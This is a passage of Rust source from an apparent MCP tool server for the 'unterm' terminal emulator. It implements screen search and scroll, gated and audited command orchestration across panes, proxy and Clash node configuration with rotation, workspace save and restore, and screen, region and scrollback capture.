        // not have to look its id up first.
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::ACTIVE_EXISTING,
        )?;
        let include_screen = params
            .get("include_screen")
            .or_else(|| params.get("include_viewport"))
            .and_then(|value| value.as_bool())
            .unwrap_or(false);
        engine.erase_scrollback(pane_id, include_screen)?;
        Ok(json!({
            "ok": true,
            "id": pane_id,
            "include_screen": include_screen,
        }))
    }

    fn screen_scroll(&self, params: &Value) -> Result<Value> {
        let offset = params.get("offset").and_then(|v| v.as_i64()).unwrap_or(0) as isize;
        let count = params.get("count").and_then(|v| v.as_i64()).unwrap_or(100) as isize;
        let engine = self.engine();
        let engine_name = engine.name();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        let text_lines: Vec<String> = engine
            .read_lines(pane_id, offset as i64, count.max(0) as usize)?
            .into_iter()
            .map(|line| line.text)
            .collect();

        let goto_requested = params
            .get("goto")
            .or_else(|| params.get("apply"))
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        let mut scrolled_to = Value::Null;
        let mut goto_skipped = Value::Null;
        if goto_requested {
            match engine.scroll_viewport_to(pane_id, offset)? {
                ViewportScrollResult::Scrolled => {
                    scrolled_to = json!({ "row": offset });
                }
                ViewportScrollResult::Unsupported { reason } => {
                    goto_skipped = json!({
                        "reason": reason,
                        "engine": engine_name,
                        "row": offset,
                    });
                }
            }
        }

        Ok(json!({
            "lines": text_lines,
            "offset": offset,
            "count": text_lines.len(),
            "scrolled_to": scrolled_to,
            "goto_skipped": goto_skipped,
        }))
    }

    /// `screen.search` — find `pattern` (case-sensitive substring) in the
    /// pane's scrollback + viewport.
    ///
    /// Params:
    /// - `pattern` (string, required)
    /// - `max_results` (int, default 50)
    /// - `goto` (bool, default false): scroll the GUI viewport so the first
    ///   match is visible — "search and jump", not just "search".
    /// - `goto_match` (int): like `goto: true` but jump to the Nth match
    ///   (0-based, clamped). Lets an agent step through matches by calling
    ///   again with the next index.
    ///
    /// Each match carries the *stable* row index (the same coordinate space
    /// as `screen.scrollback_text`'s `first_row`/`start_line`), so results
    /// stay addressable even as new output scrolls in, plus the column of
    /// the first occurrence in that line.
    fn screen_search(&self, params: &Value) -> Result<Value> {
        let pattern = params
            .get("pattern")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'pattern'"))?;
        let max_results = params
            .get("max_results")
            .and_then(|v| v.as_u64())
            .unwrap_or(50) as usize;

        let engine = self.engine();
        let engine_name = engine.name();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        // Exact matching, as this tool always has: agents search for literal
        // output they were shown, and a silently looser match would lie.
        let search_matches = engine.search(
            pane_id,
            pattern,
            unterm_engine::SearchMode::CaseSensitive,
            max_results,
        )?;
        let match_rows: Vec<isize> = search_matches.iter().map(|m| m.row as isize).collect();
        let matches: Vec<Value> = search_matches
            .into_iter()
            .map(|m| {
                json!({
                    "row": m.row,
                    "col": m.col,
                    "text": m.text,
                })
            })
            .collect();

        let goto_requested = params
            .get("goto")
            .and_then(|v| v.as_bool())
            .unwrap_or(false)
            || params.get("goto_match").is_some();

        let mut scrolled_to = Value::Null;
        let mut goto_skipped = Value::Null;
        if goto_requested && !match_rows.is_empty() {
            let index = params
                .get("goto_match")
                .and_then(|v| v.as_u64())
                .unwrap_or(0) as usize;
            let index = index.min(match_rows.len() - 1);
            let target = match_rows[index];
            match engine.scroll_viewport_to(pane_id, target)? {
                ViewportScrollResult::Scrolled => {
                    scrolled_to = json!({ "row": target, "match_index": index });
                }
                ViewportScrollResult::Unsupported { reason } => {
                    goto_skipped = json!({
                        "reason": reason,
                        "engine": engine_name,
                        "row": target,
                        "match_index": index,
                    });
                }
            }
        }

        Ok(json!({
            "matches": matches,
            "total": matches.len(),
            "scrolled_to": scrolled_to,
            "goto_skipped": goto_skipped,
        }))
    }

    // --- Orchestrate ---

    fn orchestrate_launch(&self, params: &Value) -> Result<Value> {
        let command = params.get("command").and_then(|v| v.as_str());
        if let Some(command) = command {
            if let Err(e) = self.check_policy_internal("orchestrate.launch", command) {
                return Err(e);
            }
        }

        // Create a shell first, then send the optional command through the
        // audited/gated input path. Passing `command` through session_create
        // would execute it before the write gate has a pane to attach to.
        let mut create_params = params.clone();
        if let Some(obj) = create_params.as_object_mut() {
            obj.remove("command");
        }
        let mut result = self.session_create(&create_params)?;
        if let Some(obj) = result.as_object_mut() {
            obj.insert("command".to_string(), json!(command));
        }
        let id = result.get("id").and_then(|v| v.as_u64());
        if let Some(pane_id) = id {
            if let Some(command) = command {
                // Brief delay to let shell initialize
                std::thread::sleep(std::time::Duration::from_millis(500));
                let engine = self.engine();
                let input = format!("{}\r", command);
                let pane_id = pane_id as usize;
                self.check_pane_cwd_path_scope(
                    "orchestrate.launch",
                    params,
                    pane_id,
                    engine.as_ref(),
                )?;
                match self.gate_pty_write("orchestrate.launch", pane_id, command)? {
                    GateOutcome::Allow => {
                        self.audit("orchestrate.launch", Some(&pane_id.to_string()), command);
                        engine.write_input(pane_id, &input)?;
                    }
                    GateOutcome::Block(why) => {
                        return Err(anyhow!("{why}"));
                    }
                }
            }
        }
        Ok(result)
    }

    fn orchestrate_broadcast(&self, params: &Value) -> Result<Value> {
        let command = params
            .get("command")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'command'"))?;
        let sessions = params
            .get("sessions")
            .and_then(|v| v.as_array())
            .ok_or_else(|| anyhow!("Missing 'sessions'"))?;

        if let Err(e) = self.check_policy_internal("orchestrate.broadcast", command) {
            return Err(e);
        }

        let mut results = Vec::new();
        let input = format!("{}\r", command);
        let engine = self.engine();

        for sid in sessions {
            let id_str = sid.as_str().unwrap_or("");
            if let Ok(id) = id_str.parse::<usize>() {
                if engine.get_session(id).is_err() {
                    results.push(json!({"session_id": id_str, "error": "not found"}));
                    continue;
                }
                if let Err(e) = self.check_pane_cwd_path_scope(
                    "orchestrate.broadcast",
                    params,
                    id,
                    engine.as_ref(),
                ) {
                    results.push(json!({"session_id": id_str, "error": e.to_string()}));
                    continue;
                }
                match self.gate_pty_write("orchestrate.broadcast", id, command)? {
                    GateOutcome::Allow => {}
                    GateOutcome::Block(why) => {
                        results.push(json!({"session_id": id_str, "error": why}));
                        continue;
                    }
                }
                self.audit("orchestrate.broadcast", Some(&id.to_string()), command);
                match engine.write_input(id, &input) {
                    Ok(_) => results.push(json!({"session_id": id_str, "sent": true})),
                    Err(e) => results.push(json!({"session_id": id_str, "error": e.to_string()})),
                }
            }
        }

        Ok(json!({"results": results}))
    }

    fn orchestrate_wait(&self, params: &Value) -> Result<Value> {
        let pattern = params
            .get("pattern")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'pattern'"))?;
        let timeout_ms = params
            .get("timeout_ms")
            .and_then(|v| v.as_u64())
            .unwrap_or(10000);

        let start = std::time::Instant::now();
        let timeout = std::time::Duration::from_millis(timeout_ms);
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;

        loop {
            let text = engine.read_visible_text(pane_id).unwrap_or_default();
            if text.contains(pattern) {
                return Ok(json!({"matched": true, "pattern": pattern}));
            }
            if start.elapsed() > timeout {
                return Ok(json!({"matched": false, "timed_out": true, "pattern": pattern}));
            }
            std::thread::sleep(std::time::Duration::from_millis(200));
        }
    }

    // --- Proxy ---

    /// Always reload from disk so external edits to `~/.unterm/proxy.json`
    /// (or the GUI proxy_settings overlay) are reflected immediately. The
    /// in-memory `mcp_state` proxy field is a write cache; reads should
    /// fetch fresh.
    fn refresh_proxy_state(&self) -> ProxySettings {
        let fresh = load_proxy_settings();
        mcp_state().lock().proxy = fresh.clone();
        fresh
    }

    fn proxy_status(&self) -> Result<Value> {
        let settings = self.refresh_proxy_state();
        let health = if settings.enabled {
            Some(probe_proxy_health(&settings))
        } else {
            None
        };
        // Live-probe each node so the Web Settings availability dots and the
        // rotation pool reflect reality right now, not a stale persisted flag.
        // Built explicitly (not via ProxyNodeConfig's Serialize) because the
        // transient probe fields are `skip_serializing` to keep proxy.json clean.
        let nodes: Vec<Value> = settings
            .nodes
            .iter()
            .map(|n| {
                let (available, latency_ms) = probe_node_latency(&n.url, 300);
                json!({
                    "name": n.name,
                    "url": n.url,
                    "available": available,
                    "latency_ms": latency_ms,
                })
            })
            .collect();
        Ok(json!({
            "enabled": settings.enabled,
            "mode": settings.mode,
            "http_proxy": settings.http_proxy,
            "socks_proxy": settings.socks_proxy,
            "no_proxy": settings.no_proxy,
            "current_node": settings.current_node,
            "node_count": nodes.len(),
            "nodes": nodes,
            "rotation": settings.rotation,
            "health": health,
        }))
    }

    fn proxy_nodes(&self) -> Result<Value> {
        let settings = self.refresh_proxy_state();
        Ok(json!({
            "current_node": settings.current_node,
            "nodes": settings.nodes,
        }))
    }

    fn proxy_configure(&self, params: &Value) -> Result<Value> {
        let mut state = mcp_state().lock();
        let mut settings = state.proxy.clone();

        let enabled = params
            .get("enabled")
            .and_then(|v| v.as_bool())
            .unwrap_or(true);
        let mode = params
            .get("mode")
            .and_then(|v| v.as_str())
            .unwrap_or("manual")
            .to_string();

        settings.enabled = enabled;
        settings.mode = if enabled { mode } else { "off".to_string() };

        if let Some(http) = params.get("http_proxy").and_then(|v| v.as_str()) {
            settings.http_proxy = Some(http.to_string());
        }
        if let Some(socks) = params.get("socks_proxy").and_then(|v| v.as_str()) {
            settings.socks_proxy = Some(socks.to_string());
        }
        if let Some(no_proxy) = params.get("no_proxy").and_then(|v| v.as_str()) {
            settings.no_proxy = no_proxy.to_string();
        }

        if let Some(nodes) = params.get("nodes").and_then(|v| v.as_array()) {
            settings.nodes = nodes
                .iter()
                .filter_map(|node| {
                    let name = node.get("name")?.as_str()?.to_string();
                    let url = node
                        .get("url")
                        .or_else(|| node.get("http_proxy"))
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string();
                    if url.is_empty() {
                        return None;
                    }
                    Some(ProxyNodeConfig {
                        name,
                        url,
                        latency_ms: None,
                        available: true,
                    })
                })
                .collect();
        }

        if let Some(node_name) = params.get("current_node").and_then(|v| v.as_str()) {
            settings.current_node = Some(node_name.to_string());
            if let Some(node) = settings.nodes.iter().find(|node| node.name == node_name) {
                settings.http_proxy = Some(node.url.clone());
            }
        }

        save_proxy_settings(&settings)?;
        state.proxy = settings.clone();
        drop(state);

        Ok(json!({
            "configured": true,
            "status": self.proxy_status()?,
        }))
    }

    fn proxy_disable(&self) -> Result<Value> {
        let mut state = mcp_state().lock();
        let mut settings = state.proxy.clone();
        settings.enabled = false;
        settings.mode = "off".to_string();
        save_proxy_settings(&settings)?;
        state.proxy = settings;
        Ok(json!({"disabled": true}))
    }

    /// Get or set endpoint-level auto-rotation. With no params, returns the
    /// current rotation config; otherwise updates `enabled` / `pool` /
    /// `interval_secs` and persists. The background monitor (started at GUI
    /// boot) picks up changes on its next tick. Software-agnostic — the pool is
    /// just node names that resolve to HTTP/SOCKS URLs.
    fn proxy_rotation(&self, params: &Value) -> Result<Value> {
        let mut state = mcp_state().lock();
        let mut settings = state.proxy.clone();
        let mut changed = false;
        if let Some(enabled) = params.get("enabled").and_then(|v| v.as_bool()) {
            settings.rotation.enabled = enabled;
            // Turning rotation on implies the proxy is in use — enable injection
            // too so spawned shells actually route through it and the status bar
            // reads "proxy:on" instead of confusingly showing "off". (The
            // spawn-time liveness probe still guards against a dead endpoint.)
            // We never auto-disable the proxy when rotation goes off — the user
            // may still want the proxy on its own.
            if enabled && !settings.enabled {
                settings.enabled = true;
                if settings.mode.is_empty() || settings.mode == "off" {
                    settings.mode = "auto".to_string();
                }
            }
            changed = true;
        }
        if let Some(group) = params.get("group").and_then(|v| v.as_str()) {
            settings.rotation.group = group.to_string();
            changed = true;
        }
        if let Some(pool) = params.get("pool").and_then(|v| v.as_array()) {
            settings.rotation.pool = pool
                .iter()
                .filter_map(|v| v.as_str().map(str::to_string))
                .collect();
            changed = true;
        }
        if let Some(iv) = params.get("interval_secs").and_then(|v| v.as_u64()) {
            settings.rotation.interval_secs = iv.max(10);
            changed = true;
        }
        if changed {
            save_proxy_settings(&settings)?;
            state.proxy = settings.clone();
        }
        // Report which pool nodes are known vs missing so a caller can spot a
        // typo'd pool entry.
        let known: Vec<&String> = settings
            .rotation
            .pool
            .iter()
            .filter(|name| settings.nodes.iter().any(|n| &n.name == *name))
            .collect();
        Ok(json!({
            "enabled": settings.rotation.enabled,
            "group": settings.rotation.group,
            "pool": settings.rotation.pool,
            "interval_secs": settings.rotation.interval_secs,
            "pool_resolved": known.len(),
            "current_node": settings.current_node,
        }))
    }

    /// Clash/mihomo controller status + switchable groups and their nodes
    /// (with live alive/delay pulled from the proxies snapshot). This is what
    /// powers "read the nodes, you tick boxes" — no hand-typed URLs.
    fn proxy_clash_status(&self) -> Result<Value> {
        let settings = self.refresh_proxy_state();
        let Some(ep) = resolve_clash_endpoint(&settings) else {
            return Ok(json!({
                "connected": false,
                "controller": settings.clash_controller,
                "secret_set": !settings.clash_secret.is_empty(),
            }));
        };
        let version = unterm_services::clash_api::version(&ep).unwrap_or_default();
        let proxies = match unterm_services::clash_api::proxies(&ep) {
            Ok(p) => p,
            Err(e) => return Ok(json!({ "connected": false, "error": e.to_string() })),
        };
        let map = proxies.as_object().cloned().unwrap_or_default();
        let mut groups: Vec<Value> = Vec::new();
        for (name, v) in &map {
            if v.get("type").and_then(|t| t.as_str()) != Some("Selector") {
                continue;
            }
            let now = v
                .get("now")
                .and_then(|n| n.as_str())
                .unwrap_or("")
                .to_string();
            let all = v
                .get("all")
                .and_then(|a| a.as_array())
                .cloned()
                .unwrap_or_default();
            let nodes: Vec<Value> = all
                .iter()
                .filter_map(|opt| {
                    let nm = opt.as_str()?;
                    let obj = map.get(nm);
                    // You rotate among *leaf* nodes — drop options that are
                    // themselves groups (rotating "to a group" is meaningless).
                    let ty = obj.and_then(|o| o.get("type")).and_then(|t| t.as_str());
                    if matches!(
                        ty,
                        Some("Selector") | Some("URLTest") | Some("Fallback") | Some("LoadBalance")
                    ) {
                        return None;
                    }
                    let (alive, delay) = obj.map(node_health).unwrap_or((false, None));
                    Some(json!({ "name": nm, "alive": alive, "delay": delay }))
                })
                .collect();
            groups.push(json!({ "name": name, "now": now, "nodes": nodes }));
        }
        groups.sort_by(|a, b| {
            a.get("name")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .cmp(b.get("name").and_then(|v| v.as_str()).unwrap_or(""))
        });
        Ok(json!({
            "connected": true,
            "version": version,
            "controller": ep.label(),
            "manual": !settings.clash_controller.is_empty(),
            "groups": groups,
        }))
    }

    /// Point a Clash Selector group at a specific node (manual switch from the
    /// node checkboxes' "use now" affordance, and what rotation calls on
    /// failover).
    fn proxy_clash_select(&self, params: &Value) -> Result<Value> {
        let group = params
            .get("group")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow::anyhow!("`group` required"))?;
        let name = params
            .get("name")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow::anyhow!("`name` required"))?;
        let settings = mcp_state().lock().proxy.clone();
        let ep = resolve_clash_endpoint(&settings)
            .ok_or_else(|| anyhow::anyhow!("no Clash/mihomo controller found"))?;
        unterm_services::clash_api::select(&ep, group, name)?;
        Ok(json!({ "group": group, "now": name }))
    }

    /// Set (or clear) the manual Clash controller override — the escape hatch
    /// for platforms/setups where auto-discovery can't find the controller
    /// (notably Windows, which has no Unix socket). Returns fresh clash status.
    fn proxy_clash_set_controller(&self, params: &Value) -> Result<Value> {
        let controller = params
            .get("controller")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .trim()
            .to_string();
        let secret = params
            .get("secret")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .trim()
            .to_string();
        {
            let mut state = mcp_state().lock();
            let mut settings = state.proxy.clone();
            settings.clash_controller = controller;
            settings.clash_secret = secret;
            save_proxy_settings(&settings)?;
            state.proxy = settings;
        }
        self.proxy_clash_status()
    }

    /// Replace the configured node list (name + url pairs) from the GUI, so the
    /// rotation pool can be built by clicking instead of hand-editing
    /// proxy.json. Prunes any rotation-pool entry or current_node whose node
    /// was removed. Returns the freshly probed list so the UI dots are correct.
    fn proxy_set_nodes(&self, params: &Value) -> Result<Value> {
        let incoming = params
            .get("nodes")
            .and_then(|v| v.as_array())
            .ok_or_else(|| anyhow::anyhow!("`nodes` array required"))?;
        let mut nodes: Vec<ProxyNodeConfig> = Vec::new();
        for n in incoming {
            let name = n
                .get("name")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .trim()
                .to_string();
            let url = n
                .get("url")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .trim()
                .to_string();
            // Skip blanks and duplicate names (first wins).
            if name.is_empty() || url.is_empty() || nodes.iter().any(|x| x.name == name) {
                continue;
            }
            nodes.push(ProxyNodeConfig {
                name,
                url,
                latency_ms: None,
                available: false,
            });
        }

        let mut state = mcp_state().lock();
        let mut settings = state.proxy.clone();
        settings.nodes = nodes;
        // Drop pool entries / current_node that no longer name a real node.
        let node_names: std::collections::HashSet<String> =
            settings.nodes.iter().map(|n| n.name.clone()).collect();
        settings
            .rotation
            .pool
            .retain(|name| node_names.contains(name));
        if let Some(cur) = settings.current_node.clone() {
            if !node_names.contains(&cur) {
                settings.current_node = None;
            }
        }
        save_proxy_settings(&settings)?;
        state.proxy = settings.clone();
        drop(state); // release lock before network probes

        let probed: Vec<Value> = settings
            .nodes
            .iter()
            .map(|n| {
                let (available, latency_ms) = probe_node_latency(&n.url, 300);
                json!({ "name": n.name, "url": n.url, "available": available, "latency_ms": latency_ms })
            })
            .collect();
        Ok(json!({ "nodes": probed, "pool": settings.rotation.pool }))
    }

    fn proxy_switch(&self, params: &Value) -> Result<Value> {
        let node_name = params
            .get("node_name")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'node_name'"))?;

        let mut state = mcp_state().lock();
        let mut settings = state.proxy.clone();
        let node = settings
            .nodes
            .iter()
            .find(|node| node.name == node_name)
            .cloned()
            .ok_or_else(|| anyhow!("Proxy node '{}' not found", node_name))?;

        settings.enabled = true;
        settings.mode = "manual".to_string();
        settings.current_node = Some(node.name.clone());
        settings.http_proxy = Some(node.url.clone());
        if settings.socks_proxy.is_none() && node.url.starts_with("socks") {
            settings.socks_proxy = Some(node.url.clone());
        }
        save_proxy_settings(&settings)?;
        state.proxy = settings;

        Ok(json!({
            "switched": true,
            "current_node": node.name,
            "http_proxy": node.url,
        }))
    }

    fn proxy_env(&self) -> Result<Value> {
        let settings = self.refresh_proxy_state();
        let mut env = serde_json::Map::new();
        if settings.enabled {
            // Prefer manual override URLs in proxy.json, otherwise auto-detect.
            let manual_http = settings.http_proxy.clone().filter(|s| !s.is_empty());
            let manual_socks = settings.socks_proxy.clone().filter(|s| !s.is_empty());
            let detected = if manual_http.is_none() && manual_socks.is_none() {
                unterm_services::system_proxy::detect()
            } else {
                None
            };

            let http = manual_http.or_else(|| {
                detected
                    .as_ref()
                    .and_then(|d| d.primary_http().map(str::to_string))
            });
            let socks = manual_socks.or_else(|| detected.as_ref().and_then(|d| d.socks.clone()));
            let no_proxy = detected
                .as_ref()
                .and_then(|d| d.no_proxy.clone())
                .unwrap_or_else(|| settings.no_proxy.clone());

            if let Some(http) = &http {
                env.insert("HTTP_PROXY".to_string(), json!(http));
                env.insert("HTTPS_PROXY".to_string(), json!(http));
            }
            if let Some(socks) = &socks {
                env.insert("ALL_PROXY".to_string(), json!(socks));
            }
            env.insert("NO_PROXY".to_string(), json!(no_proxy));
        }
        Ok(json!({
            "enabled": settings.enabled,
            "env": env,
        }))
    }

    fn proxy_speedtest(&self, params: &Value) -> Result<Value> {
        let target_name = params.get("node_name").and_then(|v| v.as_str());
        let timeout_ms = params
            .get("timeout_ms")
            .and_then(|v| v.as_u64())
            .unwrap_or(3000);

        let mut state = mcp_state().lock();
        let mut settings = state.proxy.clone();
        let mut results = Vec::new();

        for node in &mut settings.nodes {
            if target_name.map_or(false, |name| node.name != name) {
                continue;
            }
            let start = std::time::Instant::now();
            let available = probe_proxy_endpoint(&node.url, timeout_ms);
            node.available = available;
            node.latency_ms = if available {
                Some(start.elapsed().as_millis() as u64)
            } else {
                None
            };
            results.push(json!({
                "name": node.name,
                "url": node.url,
                "available": node.available,
                "latency_ms": node.latency_ms,
            }));
        }

        if results.is_empty() && target_name.is_some() {
            return Err(anyhow!("Proxy node '{}' not found", target_name.unwrap()));
        }

        save_proxy_settings(&settings)?;
        state.proxy = settings;
        Ok(json!({"results": results}))
    }

    // --- Workspace ---

    fn workspace_save(&self, params: &Value) -> Result<Value> {
        let name = params
            .get("name")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'name'"))?;

        let engine = self.engine();
        let sessions: Vec<Value> = engine
            .list_sessions()?
            .into_iter()
            .map(|session| {
                let cwd = session.shell.cwd.as_deref().and_then(cwd_url_to_path);
                let profile = session.shell.launch_context.profile.clone();
                json!({
                    "id": session.id,
                    "title": session.title,
                    "cwd": cwd,
                    "profile": profile,
                    "launch": {
                        "context": session.shell.launch_context,
                        "values_redacted": true,
                    },
                })
            })
            .collect();

        let workspace = json!({
            "name": name,
            "sessions": sessions,
            "saved_at": chrono::Local::now().to_rfc3339(),
        });

        // Save to ~/.unterm/workspaces/<name>.json
        let dir = unterm_protocol::state_dir()
            .unwrap_or_else(|| std::path::PathBuf::from(".unterm"))
            .join("workspaces");
        std::fs::create_dir_all(&dir)?;
        let path = dir.join(format!("{}.json", name));
        std::fs::write(&path, serde_json::to_string_pretty(&workspace)?)?;

        Ok(json!({"saved": true, "name": name, "sessions": sessions.len()}))
    }

    fn workspace_restore(&self, params: &Value) -> Result<Value> {
        let name = params
            .get("name")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("Missing 'name'"))?;

        let path = unterm_protocol::state_dir()
            .unwrap_or_else(|| std::path::PathBuf::from(".unterm"))
            .join("workspaces")
            .join(format!("{}.json", name));

        if !path.exists() {
            return Err(anyhow!("Workspace '{}' not found", name));
        }

        let data = std::fs::read_to_string(&path)?;
        let workspace: Value = serde_json::from_str(&data)?;
        let dry_run = params
            .get("dry_run")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        let sessions = workspace
            .get("sessions")
            .and_then(|v| v.as_array())
            .cloned()
            .unwrap_or_default();

        let mut planned = Vec::new();
        let mut created = Vec::new();
        let mut failed = Vec::new();

        for session in &sessions {
            let saved_id = session.get("id").cloned().unwrap_or(Value::Null);
            let title = session
                .get("title")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let cwd = session
                .get("cwd")
                .and_then(|v| v.as_str())
                .and_then(cwd_url_to_path);
            let profile = session
                .get("profile")
                .and_then(|v| v.as_str())
                .filter(|s| !s.trim().is_empty())
                .map(str::to_string);
            let command = session
                .get("command")
                .and_then(|v| v.as_str())
                .filter(|s| !s.trim().is_empty())
                .map(str::to_string);
            let launch_decision = workspace_template_launch_decision(
                saved_id.clone(),
                &title,
                cwd.as_deref(),
                profile.as_deref(),
                command.as_deref(),
            );

            planned.push(json!({
                "saved_id": saved_id,
                "title": title,
                "cwd": cwd,
                "launch": {
                    "decision": launch_decision,
                },
            }));

            if dry_run {
                continue;
            }

            let mut create_params = json!({});
            if let Some(cwd) = &cwd {
                create_params["cwd"] = json!(cwd);
            }
            if let Some(profile) = &profile {
                create_params["profile"] = json!(profile);
            }
            if let Some(command) = &command {
                create_params["command"] = json!(command);
            }
            match self.session_create(&create_params) {
                Ok(value) => {
                    created.push(json!({
                        "saved_id": saved_id,
                        "cwd": cwd,
                        "launch": {
                            "decision": value.get("launch").and_then(|launch| launch.get("decision")).cloned().unwrap_or(Value::Null),
                        },
                        "created": value,
                    }));
                }
                Err(err) => {
                    failed.push(json!({
                        "saved_id": saved_id,
                        "cwd": cwd,
                        "error": err.to_string(),
                    }));
                }
            }
        }

        Ok(json!({
            "restored": !dry_run && failed.is_empty(),
            "dry_run": dry_run,
            "name": name,
            "path": path,
            "workspace": workspace,
            "planned": planned,
            "created": created,
            "failed": failed,
        }))
    }

    fn workspace_list(&self) -> Result<Value> {
        let dir = unterm_protocol::state_dir()
            .unwrap_or_else(|| std::path::PathBuf::from(".unterm"))
            .join("workspaces");

        let mut workspaces = Vec::new();
        if dir.exists() {
            if let Ok(entries) = std::fs::read_dir(&dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.extension().map_or(false, |e| e == "json") {
                        let name = path
                            .file_stem()
                            .unwrap_or_default()
                            .to_string_lossy()
                            .to_string();
                        let mut item = json!({
                            "name": name,
                            "path": path,
                        });
                        match std::fs::read_to_string(&path)
                            .ok()
                            .and_then(|data| serde_json::from_str::<Value>(&data).ok())
                        {
                            Some(workspace) => {
                                item["saved_at"] =
                                    workspace.get("saved_at").cloned().unwrap_or(Value::Null);
                                item["session_count"] = json!(workspace
                                    .get("sessions")
                                    .and_then(|v| v.as_array())
                                    .map(|sessions| sessions.len())
                                    .unwrap_or(0));
                            }
                            None => {
                                item["saved_at"] = Value::Null;
                                item["session_count"] = json!(0);
                                item["error"] = json!("could not read workspace file");
                            }
                        }
                        workspaces.push(item);
                    }
                }
            }
        }
        workspaces.sort_by(|a, b| {
            a.get("name")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .cmp(b.get("name").and_then(|v| v.as_str()).unwrap_or(""))
        });

        Ok(json!({"workspaces": workspaces}))
    }

    // --- Capture ---

    fn capture_screen(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let sessions = engine.list_sessions()?;
        let mut captures = Vec::with_capacity(sessions.len());

        for session in &sessions {
            let text = engine.read_visible_text(session.id).unwrap_or_default();
            captures.push(json!({
                "session_id": session.id.to_string(),
                "title": session.title,
                "screen": text,
                "type": "text",
            }));
        }

        let include_base64 = params
            .get("include_base64")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        let image = engine.capture_screen_image(include_base64)?;
        Ok(json!({
            "captures": captures,
            "image": image,
            "type": "image/png",
            "text_snapshot": true,
        }))
    }

    fn capture_window(&self, params: &Value) -> Result<Value> {
        let title_filter = params.get("title").and_then(|v| v.as_str());
        let pid_filter = params.get("pid").and_then(|v| v.as_u64()).map(|v| v as u32);
        let engine = self.engine();
        let sessions = engine.list_sessions()?;

        let include_base64 = params
            .get("include_base64")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        let image = engine.capture_window_image(title_filter, pid_filter, include_base64)?;

        for session in &sessions {
            let pane_title = &session.title;
            let matches = title_filter.map_or(true, |t| {
                pane_title.contains(t) || session.id.to_string().contains(t)
            });
            if matches {
                let text = engine.read_visible_text(session.id).unwrap_or_default();
                return Ok(json!({
                    "session_id": session.id.to_string(),
                    "title": pane_title,
                    "screen": text,
                    "image": image,
                    "type": "image/png",
                    "text_snapshot": true,
                }));
            }
        }

        Ok(json!({
            "image": image,
            "type": "image/png",
            "text_snapshot": false,
        }))
    }

    /// `capture.select` -- a rectangle of the desktop.
    ///
    /// A person selects one by dragging a box; an agent has no way to drag, so
    /// it passes the rectangle instead. Without one there is nothing to
    /// select, so the documented headless fallback captures the whole screen
    /// and says plainly that no interactive selection occurred.
    fn capture_select(&self, params: &Value) -> Result<Value> {
        let number = |name: &str| params.get(name).and_then(|value| value.as_i64());
        match (
            number("left"),
            number("top"),
            number("width"),
            number("height"),
        ) {
            (Some(left), Some(top), Some(width), Some(height)) if width > 0 && height > 0 => {
                let image = self.engine().capture_region_image(
                    left as i32,
                    top as i32,
                    width as usize,
                    height as usize,
                    false,
                )?;
                Ok(json!({
                    "image": image,
                    "type": "image/png",
                    "mode": "region",
                }))
            }
            _ => {
                let mut value = self.capture_screen(&json!({"include_base64": false}))?;
                value["mode"] = json!("screen_fallback");
                value["message"] = json!(concat!(
                    "Pass left/top/width/height to capture a region; ",
                    "headless selection has no pointer, so the whole screen was captured.",
                ));
                Ok(value)
            }
        }
    }

    fn capture_clipboard(&self) -> Result<Value> {
        clipboard_read_any()
    }

    /// Scrolling screenshot of the terminal itself: headlessly re-render the
    /// pane's entire scrollback into one tall PNG (no pixel capture, no
    /// occlusion constraints). `screen.scrollback_text` remains the
    /// AI-friendly text path; this is the human-shareable image path.
    fn capture_scrollback(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = if Self::pane_id_param(params)?.is_some() {
            Some(self.resolve_pane_id(
                engine.as_ref(),
                params,
                PaneResolutionOptions::REQUIRED_EXISTING,
            )?)
        } else {
            None
        };
        let mut opts = unterm_services::scrollback_options::ScrollbackPngOptions::default();
        if let Some(n) = params.get("max_rows").and_then(|v| v.as_u64()) {
            opts.max_rows = (n as usize).max(1);
        }
        if let Some(n) = params.get("dpi").and_then(|v| v.as_u64()) {
            opts.dpi = (n as usize).clamp(48, 288);
        }
        let dir = capture_output_dir()?;
        let path = dir.join(format!(
            "scrollback_{}.png",
            chrono::Local::now().format("%Y%m%d_%H%M%S_%3f")
        ));
        // Only a front end can render this: the renderer is built on its own
        // font stack, so the reply comes back already shaped.
        let host = unterm_engine::mcp_host()
            .ok_or_else(|| anyhow!("no front end is hosting this MCP surface"))?;
        let mut value = host.render_scrollback_png(pane_id, &path, opts.max_rows, opts.dpi)?;
        let session = value
            .get("session_id")
            .and_then(|id| id.as_str())
            .unwrap_or_default()
            .to_string();
        self.audit("capture.scrollback", Some(&session), "");
        if let Some(object) = value.as_object_mut() {
            object.insert("type".to_string(), json!("image/png"));
        }
        Ok(value)
    }

    /// Scrolling screenshot of ANOTHER app's window (macOS): synthesize
